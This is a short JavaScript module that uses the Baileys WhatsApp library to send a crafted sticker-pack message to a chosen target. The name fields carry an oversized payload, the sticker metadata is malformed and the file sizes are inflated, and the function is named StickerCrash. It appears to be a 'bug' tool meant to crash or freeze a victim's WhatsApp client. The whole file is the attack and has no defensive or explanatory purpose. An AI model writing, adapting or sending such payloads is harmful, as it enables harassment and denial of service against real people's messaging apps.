
const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');
const { getSuperPayload } = require('./SuperPayload');

function createSticker(fileName) {
  return {
    fileName,
    isAnimated: false,
    isLottie: true,
    mimetype: "application/pdf",
    emojis: ["🀄"],
    accessibilityLabel: "ROBIN BUG"
  };
}

async function StickerCrash(SYxS7, target) {
  const superSpam = getSuperPayload(25000);
  const stickers = Array(10).fill(createSticker("FlMx-HjycYUqguf2rn67DhDY1X5ZIDMaxjTkqVafOt8=.webp"));
  
  await SYxS7.relayMessage(
    target,
    {
      stickerPackMessage: {
        stickerPackId: "X",
        name: superSpam,
        publisher: superSpam,
        packDescription: superSpam,
        stickers: stickers,
        fileLength: "999999",
        stickerPackSize: "999999999",
        contextInfo: {
          quotedMessage: {
            paymentInviteMessage: {
              serviceType: 3,
              expiryTimestamp: Date.now() + 1814400000
            }
          }
        }
      }
    },
    { participant: { jid: target } }
  );
}

module.exports = { StickerCrash };
